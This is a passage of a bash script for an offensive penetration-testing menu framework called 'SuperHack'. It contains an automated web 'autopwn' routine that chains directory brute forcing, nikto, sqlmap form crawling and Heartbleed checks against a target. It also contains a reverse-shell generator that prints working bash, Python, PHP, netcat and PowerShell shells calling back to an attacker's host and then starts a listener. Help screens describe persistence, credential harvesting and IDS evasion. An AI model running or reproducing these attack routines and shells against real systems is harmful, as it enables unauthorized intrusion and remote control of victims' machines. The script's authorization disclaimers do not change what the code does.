        jq -r '.[].name_value' 2>/dev/null | sort -u > "$report_dir/cert_transparency.txt" || true
    
    # Step 4: Directory brute force with multiple wordlists
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Directory Brute Force"
    echo ""
    if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
        timeout 300 gobuster dir -u "$target_url" \
            -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
            -o "$report_dir/directories_common.txt" -t 50 -x php,txt,html,bak,old 2>/dev/null || true
    fi
    
    if [[ "$mode" == "deep" && -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" ]]; then
        timeout 600 gobuster dir -u "$target_url" \
            -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" \
            -o "$report_dir/directories_deep.txt" -t 50 -x php,txt,html,bak,old,zip,tar.gz 2>/dev/null || true
    fi
    
    # Step 5: Vulnerability scan
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Vulnerability Scanning"
    echo ""
    timeout 600 nikto -h "$target_url" -output "$report_dir/nikto.txt" 2>/dev/null || true
    
    # Step 6: SQL injection testing
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "SQL Injection Testing"
    echo ""
    timeout 300 sqlmap -u "$target_url" --batch --forms --crawl="$crawl_depth" \
        --level="$sqlmap_level" --risk="$sqlmap_risk" \
        --output-dir="$report_dir/sqlmap" 2>/dev/null || true
    
    # Step 7: SSL/TLS scan if HTTPS
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "SSL/TLS Analysis"
    echo ""
    if [[ "$target_url" =~ ^https ]]; then
        nmap --script ssl-enum-ciphers -p 443 "$domain" -oN "$report_dir/ssl_scan.txt" 2>/dev/null || true
        
        if command -v sslyze &>/dev/null; then
            sslyze "$target_url" > "$report_dir/sslyze.txt" 2>/dev/null || true
        fi
        
        # Test for Heartbleed
        nmap --script ssl-heartbleed -p 443 "$domain" -oN "$report_dir/heartbleed.txt" 2>/dev/null || true
    fi
    
    # Step 8: Generate report
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Generating Report"
    echo ""
    
    # Calculate findings
    local dir_count=$(grep -c "Status: 200" "$report_dir/directories_common.txt" 2>/dev/null || echo "0")
    local sqlmap_vulns=$(find "$report_dir/sqlmap" -name "*.log" -exec grep -l "vulnerable" {} \; 2>/dev/null | wc -l)
    
    cat > "$report_dir/WEB_AUTOPWN_REPORT.txt" << EOF
╔═══════════════════════════════════════════════════════════╗
║           WEB AUTOPWN REPORT - $mode MODE                   ║
╚═══════════════════════════════════════════════════════════╝

Target: $target_url
Domain: $domain
Date: $(date)
Scan ID: $timestamp
Crawl Depth: $crawl_depth
SQLMap Level: $sqlmap_level
SQLMap Risk: $sqlmap_risk

=== SCAN STATISTICS ===
Directories Found: $dir_count
SQL Injection Vulnerabilities: $sqlmap_vulns

=== HTTP HEADERS ===
$(cat "$report_dir/headers.txt" 2>/dev/null || echo "Not available")

=== WEB TECHNOLOGIES ===
$(cat "$report_dir/whatweb.txt" 2>/dev/null | head -5 || echo "See whatweb.txt")

=== WAF DETECTION ===
$(cat "$report_dir/waf_detect.txt" 2>/dev/null || echo "No WAF detected")

=== DNS INFO ===
$(cat "$report_dir/dns.txt" 2>/dev/null || echo "Not available")

=== SUBDOMAINS ===
$(grep "has address" "$report_dir/subdomains.txt" 2>/dev/null | head -10 || echo "None found")

=== DIRECTORIES FOUND ===
$(cat "$report_dir/directories_common.txt" 2>/dev/null | head -30 || echo "See directories_*.txt")

=== VULNERABILITIES (Nikto) ===
$(grep -E "OSVDB|CVE" "$report_dir/nikto.txt" 2>/dev/null | head -20 || echo "See nikto.txt")

=== SQL INJECTION RESULTS ===
$(find "$report_dir/sqlmap" -name "*.log" -exec cat {} \; 2>/dev/null | grep -E "vulnerable|injection" | head -10 || echo "No SQLi found")

=== FILES GENERATED ===
$(ls -la "$report_dir/" 2>/dev/null)

=== NEXT STEPS ===
1. Review directories_*.txt for interesting paths
2. Check nikto.txt for vulnerabilities
3. Review sqlmap/ directory for SQL injection findings
4. If SSL scan present, check for weak ciphers
5. Test discovered endpoints manually
6. Check cert_transparency.txt for additional subdomains

=== SECURITY RECOMMENDATIONS ===
$(if [[ $sqlmap_vulns -gt 0 ]]; then echo "[!] CRITICAL: $sqlmap_vulns SQL injection vulnerabilities found!"; fi)
$(if grep -q "CVE" "$report_dir/nikto.txt" 2>/dev/null; then echo "[!] Known CVEs detected - see nikto.txt"; fi)
$(if grep -q "vulnerable" "$report_dir/heartbleed.txt" 2>/dev/null; then echo "[!] Heartbleed vulnerability detected!"; fi)

Report saved to: $report_dir/
EOF

    echo -e "${GREEN}[+] Web autopwn complete! Report saved to: $report_dir/WEB_AUTOPWN_REPORT.txt${NC}"
    cat "$report_dir/WEB_AUTOPWN_REPORT.txt"
    
    # Auto-open report option
    local view_report=$(read_input "View full report now? (y/n): ")
    [[ "$view_report" == "y" ]] && less "$report_dir/WEB_AUTOPWN_REPORT.txt"
    
    echo -n "Press Enter to continue..."
    read
}

autopwn_custom() {
    show_menu "Autopwn Custom Parameters" "Fully customizable automated exploitation"
    
    local target_type=$(read_input "Target type (1=IP, 2=URL): ")
    [[ "$target_type" == "99" ]] && return
    
    if [[ "$target_type" == "1" ]]; then
        autopwn_ip "custom"
    elif [[ "$target_type" == "2" ]]; then
        autopwn_url "custom"
    else
        echo -e "${RED}Invalid selection${NC}"
        sleep 1
    fi
}

# =============================================================================
# INFO MODULE - ENHANCED WITH HOW TO USE, HACKING STEPS, AND FAQ
# =============================================================================

info_menu() {
    while true; do
        show_menu "Information & Help" "1) Framework Information
2) Tool Descriptions
3) How to Use This Framework
4) Hacking Steps & Orchestration
5) Usage Guidelines
6) Legal Disclaimer
7) Help/FAQ
8) System Information
9) View Logs
0) Back to Main Menu"
        
        local info_choice=$(read_input "Select option: ")
        
        case $info_choice in
            1) framework_info ;;
            2) tool_descriptions ;;
            3) how_to_use ;;
            4) hacking_steps ;;
            5) usage_guidelines ;;
            6) legal_disclaimer ;;
            7) help_faq ;;
            8) system_info ;;
            9) view_logs ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

framework_info() {
    show_menu "Framework Information" "System and tool information"
    
    echo -e "${BLUE}[*] Framework Information${NC}"
    echo ""
    echo "SuperHack Framework v$VERSION"
    echo "======================="
    echo ""
    echo "Configuration Directory: $CONFIG_DIR"
    echo "Log Directory: $LOG_DIR"
    echo "Wordlists Directory: $WORDLISTS_DIR"
    echo "Results Directory: $RESULTS_DIR"
    echo ""
    echo "Installed Tools:"
    for tool in nmap metasploit-framework hydra gobuster aircrack-ng john hashcat sqlmap nikto; do
        if command -v "$tool" &>/dev/null; then
            local version=$($tool --version 2>/dev/null | head -1 || echo "installed")
            echo "  [+] $tool: $version"
        else
            echo "  [-] $tool: not installed"
        fi
    done
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

tool_descriptions() {
    show_menu "Tool Descriptions" "Available security tools"
    
    echo -e "${BLUE}[*] Tool Descriptions${NC}"
    echo ""
    echo "=== Network Scanning ==="
    echo "Nmap         - Port scanner and network discovery"
    echo "Masscan      - High-speed port scanner"
    echo ""
    echo "=== Enumeration ==="
    echo "Enum4linux   - SMB enumeration for Windows"
    echo "Gobuster     - Directory/file brute forcer"
    echo "Nikto        - Web vulnerability scanner"
    echo ""
    echo "=== Exploitation ==="
    echo "Metasploit   - Exploitation framework"
    echo "SQLMap       - SQL injection automation"
    echo "Hydra        - Login brute forcer"
    echo ""
    echo "=== Wireless ==="
    echo "Aircrack-ng  - WiFi security auditing"
    echo "Reaver       - WPS PIN attack tool"
    echo ""
    echo "=== Password Cracking ==="
    echo "John         - Password hash cracker"
    echo "Hashcat      - GPU-accelerated hash cracker"
    echo ""
    echo "=== OSINT ==="
    echo "theHarvester - Email harvesting"
    echo "Shodan       - Internet device search"
    echo ""
    echo "=== Blue Team ==="
    echo "ClamAV       - Antivirus scanner"
    echo "rkhunter     - Rootkit detector"
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

how_to_use() {
    show_menu "How to Use This Framework" "Getting started guide"
    
    echo -e "${BLUE}[*] How to Use SuperHack Framework${NC}"
    echo ""
    echo "=== GETTING STARTED ==="
    echo ""
    echo "1. INITIAL SETUP"
    echo "   - Run the framework with: sudo ./superhack.sh"
    echo "   - The framework will automatically create necessary directories"
    echo "   - Install missing packages when prompted"
    echo ""
    echo "2. BASIC WORKFLOW"
    echo "   a) Start with Network Scanning to discover targets"
    echo "   b) Use Enumeration modules to gather detailed information"
    echo "   c) Run Vulnerability scans to find weaknesses"
    echo "   d) Use Exploitation tools (with authorization)"
    echo "   e) Generate reports from Results directory"
    echo ""
    echo "3. USING MODULES"
    echo "   - Select a category from the main menu"
    echo "   - Follow the prompts to configure your scan/attack"
    echo "   - Results are automatically saved to $RESULTS_DIR"
    echo ""
    echo "4. AUTOPWN FEATURE"
    echo "   - Automated scanning and exploitation"
    echo "   - Three modes: Standard, Stealth, Aggressive"
    echo "   - Progress bar shows completion percentage"
    echo "   - Comprehensive report generated automatically"
    echo ""
    echo "5. SAVING RESULTS"
    echo "   - Most modules prompt to save results"
    echo "   - All results stored in categorized subdirectories"
    echo "   - Logs automatically saved to $LOG_DIR"
    echo ""
    echo "6. NAVIGATION"
    echo "   - Use menu numbers to select options"
    echo "   - Enter '0' to go back or exit"
    echo "   - Type '<back>' at any prompt to return to previous menu"
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

hacking_steps() {
    show_menu "Hacking Steps & Orchestration" "The penetration testing methodology"
    
    echo -e "${BLUE}[*] The Steps of Hacking${NC}"
    echo ""
    echo "=== PHASE 1: RECONNAISSANCE ==="
    echo "Goal: Gather information about the target"
    echo ""
    echo "Passive Reconnaissance (OSINT):"
    echo "  • Domain information gathering (WHOIS, DNS)"
    echo "  • Email harvesting with theHarvester"
    echo "  • Social media intelligence"
    echo "  • Certificate transparency logs"
    echo "  • Shodan searches for exposed services"
    echo ""
    echo "Active Reconnaissance:"
    echo "  • Network discovery (ping sweeps)"
    echo "  • Port scanning (Nmap)"
    echo "  • Service version detection"
    echo ""
    echo "=== PHASE 2: ENUMERATION ==="
    echo "Goal: Extract detailed information about services"
    echo ""
    echo "Network Enumeration:"
    echo "  • SMB shares and users (enum4linux)"
    echo "  • LDAP/Active Directory queries"
    echo "  • SNMP community strings"
    echo ""
    echo "Web Enumeration:"
    echo "  • Directory brute forcing (Gobuster)"
    echo "  • Subdomain enumeration"
    echo "  • Technology fingerprinting (WhatWeb)"
    echo "  • Parameter discovery"
    echo ""
    echo "=== PHASE 3: VULNERABILITY ANALYSIS ==="
    echo "Goal: Identify security weaknesses"
    echo ""
    echo "Automated Scanning:"
    echo "  • Nikto for web vulnerabilities"
    echo "  • Nmap NSE scripts for service vulns"
    echo "  • SQLMap for injection points"
    echo "  • SSL/TLS configuration analysis"
    echo ""
    echo "Manual Verification:"
    echo "  • Review scan results for false positives"
    echo "  • Confirm exploitability"
    echo "  • Check for business logic flaws"
    echo ""
    echo "=== PHASE 4: EXPLOITATION ==="
    echo "Goal: Gain access to systems"
    echo ""
    echo "Methods:"
    echo "  • Brute force attacks (Hydra, Medusa)"
    echo "  • SQL injection exploitation"
    echo "  • Known vulnerability exploitation"
    echo "  • Social engineering (Phishing tools)"
    echo "  • Wireless attacks (WPA cracking, Evil Twin)"
    echo ""
    echo "=== PHASE 5: POST-EXPLOITATION ==="
    echo "Goal: Maintain access and gather intelligence"
    echo ""
    echo "Activities:"
    echo "  • Privilege escalation"
    echo "  • Credential harvesting"
    echo "  • Lateral movement"
    echo "  • Persistence establishment"
    echo "  • Data exfiltration (authorized)"
    echo ""
    echo "=== PHASE 6: REPORTING ==="
    echo "Goal: Document findings and recommendations"
    echo ""
    echo "Report Components:"
    echo "  • Executive summary"
    echo "  • Technical findings with evidence"
    echo "  • Risk ratings and CVSS scores"
    echo "  • Remediation recommendations"
    echo "  • Appendices with raw output"
    echo ""
    echo "=== ORCHESTRATION TIPS ==="
    echo ""
    echo "1. Always start with least intrusive methods"
    echo "2. Document every command and output"
    echo "3. Use the Autopwn feature for comprehensive scans"
    echo "4. Save results at each phase"
    echo "5. Verify findings manually before reporting"
    echo "6. Maintain a chain of custody for evidence"
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

usage_guidelines() {
    show_menu "Usage Guidelines" "Best practices and workflow"
    
    echo -e "${BLUE}[*] Usage Guidelines${NC}"
    echo ""
    echo "1. ALWAYS obtain written permission before testing"
    echo "2. Document all activities and findings"
    echo "3. Respect scope boundaries"
    echo "4. Do not exfiltrate sensitive data"
    echo "5. Report vulnerabilities responsibly"
    echo "6. Maintain confidentiality of findings"
    echo ""
    echo "Workflow:"
    echo "1. Reconnaissance (OSINT, scanning)"
    echo "2. Enumeration (services, shares, users)"
    echo "3. Vulnerability Assessment"
    echo "4. Exploitation (with authorization)"
    echo "5. Post-Exploitation"
    echo "6. Reporting"
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

legal_disclaimer() {
    show_banner
    echo -e "${RED}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║                    LEGAL DISCLAIMER                       ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo ""
    echo "This framework is for AUTHORIZED security testing only."
    echo ""
    echo "Unauthorized access to computer systems is illegal under:"
    echo "  - Computer Fraud and Abuse Act (US)"
    echo "  - Computer Misuse Act (UK)"
    echo "  - Similar laws in your jurisdiction"
    echo ""
    echo "Users are responsible for:"
    echo "  - Obtaining proper authorization"
    echo "  - Complying with applicable laws"
    echo "  - Using tools ethically and responsibly"
    echo ""
    echo "The authors assume NO liability for misuse or damage."
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

help_faq() {
    show_menu "Help & FAQ" "Frequently Asked Questions"
    
    echo -e "${BLUE}[*] Frequently Asked Questions${NC}"
    echo ""
    echo "Q: Why do I need to run as root?"
    echo "A: Many penetration testing tools require raw socket access"
    echo "   for packet crafting and network interface manipulation."
    echo ""
    echo "Q: Where are my scan results saved?"
    echo "A: Results are saved in: $RESULTS_DIR"
    echo "   Each scan type has its own subdirectory (nmap, enumeration,"
    echo "   exploitation, wifi, etc.)"
    echo ""
    echo "Q: How do I update the tools?"
    echo "A: Use System > Update Framework from the main menu, or"
    echo "   run 'apt update && apt upgrade' manually."
    echo ""
    echo "Q: Can I use this on any network?"
    echo "A: NO! Only use on networks you own or have explicit"
    echo "   written permission to test. Unauthorized access is illegal."
    echo ""
    echo "Q: What is the Autopwn feature?"
    echo "A: Autopwn automates the entire penetration testing workflow"
    echo "   from reconnaissance to exploitation. Use with caution!"
    echo ""
    echo "Q: How do I use decoy IPs in Nmap?"
    echo "A: In Advanced Nmap Scanner, select 'Decoy IP Options'"
    echo "   to hide your scan among decoy traffic."
    echo ""
    echo "Q: What wordlists are available?"
    echo "A: The framework includes rockyou.txt and SecLists."
    echo "   Additional wordlists can be added to: $WORDLISTS_DIR"
    echo ""
    echo "Q: How do I report bugs?"
    echo "A: Contact the framework maintainer or check for updates"
    echo "   in the System menu."
    echo ""
    echo "Q: Can I resume interrupted scans?"
    echo "A: Nmap scans can be resumed using: nmap --resume <file>"
    echo "   Other tools must be restarted."
    echo ""
    echo "Q: What is the difference between Stealth and Aggressive modes?"
    echo "A: Stealth mode uses slower timing and fragmentation to evade"
    echo "   IDS/IPS. Aggressive mode is faster but more detectable."
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# POST-EXPLOITATION & UTILITIES
# =============================================================================

# Network listener/ncat wrapper
network_listener() {
    check_install netcat-traditional nc
    
    show_menu "Network Listener" "Listen for incoming connections"
    
    local listen_port=$(read_input "Enter port to listen on: ")
    [[ -z "$listen_port" ]] && return
    [[ "$listen_port" == "99" ]] && return
    
    local save_output=$(read_input "Save output to file? (y/n): ")
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -e "${YELLOW}[*] Starting listener on port $listen_port...${NC}"
    echo -e "${RED}[!] Run this in another terminal if you need to continue using this menu:${NC}"
    echo -e "${CYAN}nc -lvp $listen_port${NC}"
    echo ""
    local start_now=$(read_input "Start listener now? (y/n): ")
    
    if [[ "$start_now" == "y" ]]; then
        if [[ "$save_output" == "y" ]]; then
            local output_file="$RESULTS_DIR/netcat_listener_$timestamp.txt"
            echo -e "${YELLOW}[*] Listening... (Ctrl+C to stop)${NC}"
            nc -lvp "$listen_port" | tee "$output_file"
            echo -e "${GREEN}[+] Output saved to: $output_file${NC}"
        else
            echo -e "${YELLOW}[*] Listening... (Ctrl+C to stop)${NC}"
            nc -lvp "$listen_port"
        fi
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Quick reverse shell generator
quick_reverse_shell() {
    show_menu "Quick Reverse Shell Generator" "Generate reverse shell commands"
    
    local lhost=$(read_input "Enter your IP (LHOST): ")
    [[ -z "$lhost" ]] && return
    [[ "$lhost" == "99" ]] && return
    
    local lport=$(read_input "Enter port (LPORT): ")
    [[ "$lport" == "99" ]] && return
    
    echo ""
    echo -e "${CYAN}=== Bash ===${NC}"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo ""
    echo -e "${CYAN}=== Python ===${NC}"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo -e "${CYAN}=== PHP ===${NC}"
    echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo -e "${CYAN}=== Netcat ===${NC}"
    echo "nc -e /bin/sh $lhost $lport"
    echo ""
    echo -e "${CYAN}=== PowerShell ===${NC}"
    echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    echo ""
    
    local start_listener=$(read_input "Start listener now? (y/n): ")
    if [[ "$start_listener" == "y" ]]; then
        echo -e "${YELLOW}[*] Starting listener...${NC}"
        echo -e "${RED}[!] This will block the terminal. Run in another terminal to continue:${NC}"
        echo -e "${CYAN}nc -lvp $lport${NC}"
        echo ""
        echo -n "Press Enter to start listener (Ctrl+C to stop)..."
        read
        nc -lvp "$lport"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Log viewer
view_logs() {
    show_menu "Session Logs" "View framework activity logs"
    
    echo -e "${BLUE}[*] Session Logs${NC}"
    
    if [[ ! -d "$LOG_DIR" ]] || [[ -z "$(ls -A "$LOG_DIR" 2>/dev/null)" ]]; then
        echo -e "${YELLOW}[!] No logs found${NC}"
    else
        echo "Available logs:"
        ls -la "$LOG_DIR"/*.log 2>/dev/null || echo "No .log files found"
        echo ""
        local log_file=$(read_input "View log file (enter filename or 'all'): ")
        
        if [[ "$log_file" == "all" ]]; then
            for f in "$LOG_DIR"/*.log; do
                [[ -f "$f" ]] && echo -e "\n=== $f ===" && cat "$f"
            done
        elif [[ -f "$LOG_DIR/$log_file" ]]; then
            cat "$LOG_DIR/$log_file"
        fi
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# System information
system_info() {
    show_menu "System Information" "Display system configuration"
    
    echo -e "${BLUE}[*] System Information${NC}"
    echo ""
    echo -e "${CYAN}=== OS Information ===${NC}"
    uname -a
    echo ""
    echo -e "${CYAN}=== Network Interfaces ===${NC}"
    ip addr show 2>/dev/null || ifconfig -a
    echo ""
    echo -e "${CYAN}=== Routing Table ===${NC}"
    ip route 2>/dev/null || route -n
    echo ""
    echo -e "${CYAN}=== Wireless Interfaces ===${NC}"
    iw dev 2>/dev/null || echo "No wireless interfaces found"
    echo ""
    echo -e "${CYAN}=== Disk Usage ===${NC}"
    df -h "$CONFIG_DIR"
    echo ""
    echo -e "${CYAN}=== Memory ===${NC}"
    free -h 2>/dev/null || cat /proc/meminfo | head -3
    
    echo -n "Press Enter to continue..."
    read
}

# Update framework
update_framework() {
    show_menu "Update Framework" "Update packages and dependencies"
    
    echo -e "${BLUE}[*] Updating SuperHack Framework${NC}"
    
    echo -e "${YELLOW}[*] Updating package lists...${NC}"
    apt-get update -qq
    
    echo -e "${YELLOW}[*] Upgrading installed packages...${NC}"
    apt-get upgrade -y
    
    echo -e "${YELLOW}[*] Updating wordlists...${NC}"
    if [[ -d "$WORDLISTS_DIR/seclists/.git" ]]; then
        cd "$WORDLISTS_DIR/seclists" && git pull
    fi
    
    echo -e "${GREEN}[+] Update complete!${NC}"
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# MAIN MENU & EXECUTION
# =============================================================================

# Display main menu
main_menu() {
    while true; do
        show_banner
        echo ""
        echo -e "${GREEN}  [1]${NC} Network Scanning        ${GREEN}[7]${NC}  Phishing Tools"
        echo -e "${GREEN}  [2]${NC} Enumeration             ${GREEN}[8]${NC}  Wireless Attacks"
        echo -e "${GREEN}  [3]${NC} Brute Force             ${GREEN}[9]${NC}  Utilities"
        echo -e "${GREEN}  [4]${NC} Payload Generation      ${GREEN}[10]${NC} System"
        echo -e "${GREEN}  [5]${NC} Exploit Database        ${GREEN}[11]${NC} OSINT"
        echo -e "${GREEN}  [6]${NC} Password Cracking       ${GREEN}[12]${NC} Blue Team"
        echo ""
        echo -e "${MAGENTA}  [A]${NC} Autopwn (Auto Exploit)"
        echo -e "${MAGENTA}  [I]${NC} Information/Help"
        echo ""
        echo -e "${YELLOW}  [0] Exit Framework${NC}"
        echo ""
        local menu_choice=$(read_input "Select option: ")
        
        case $menu_choice in
            1)
                while true; do
                    show_menu "Network Scanning" "1) Advanced Nmap Scanner
2) Network Discovery (Ping Sweep)
3) Quick Port Scanner
4) Terminal Wireshark Capture
0) Back to Main Menu"
                    
                    local scan_choice=$(read_input "Choice: ")
                    case $scan_choice in
                        1) advanced_nmap_scan ;;
                        2) network_discovery ;;
                        3) port_scanner ;;
                        4) wireshark_terminal ;;
                        0) break ;;
                    esac
                done
                ;;
            2)
                while true; do
                    show_menu "Enumeration" "1) SMB Enumeration
2) LDAP/AD Enumeration
3) Web Enumeration
4) Subdomain Enumeration
0) Back to Main Menu"
                    
                    local enum_choice=$(read_input "Choice: ")
                    case $enum_choice in
                        1) smb_enum ;;
                        2) ldap_enum ;;
                        3) web_enum ;;
                        4) subdomain_enum ;;
                        0) break ;;
                    esac
                done
                ;;
            3) brute_force ;;
            4) payload_gen ;;
            5) exploit_search ;;
            6) password_crack ;;
            7) phishing_menu ;;
            8) wifi_attacks ;;
            9)
                while true; do
                    show_menu "Utilities" "1) Network Listener
2) Quick Reverse Shell
3) View Logs
0) Back to Main Menu"
                    
                    local util_choice=$(read_input "Choice: ")
                    case $util_choice in
                        1) network_listener ;;
                        2) quick_reverse_shell ;;
                        3) view_logs ;;
                        0) break ;;
                    esac
                done
                ;;
            10)
                while true; do
                    show_menu "System" "1) System Information
2) Update Framework
3) Initialize Directories
4) Package Manager
0) Back to Main Menu"
                    
                    local sys_choice=$(read_input "Choice: ")
                    case $sys_choice in
                        1) system_info ;;
                        2) update_framework ;;
                        3) init_dirs ;;
                        4) smart_package_manager ;;
                        0) break ;;
                    esac
                done
                ;;
            11) osint_menu ;;
            12) blueteam_menu ;;
            [Aa]) autopwn_menu ;;
            [Ii]) info_menu ;;
            0)
                echo -e "${GREEN}[+] Exiting SuperHack Framework${NC}"
                echo -e "${YELLOW}[*] Goodbye!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# =============================================================================
# SCRIPT ENTRY POINT
# =============================================================================

# Initialize log file
LOG_FILE="$LOG_DIR/superhack_$(date +%Y%m%d_%H%M%S).log"

# Redirect all output to log file as well as terminal
exec > >(tee -a "$LOG_FILE") 2>&1

# Show startup banner
show_banner

# Initialize directories
init_dirs

# Check and install missing packages
smart_package_manager

# Start main menu
main_menu
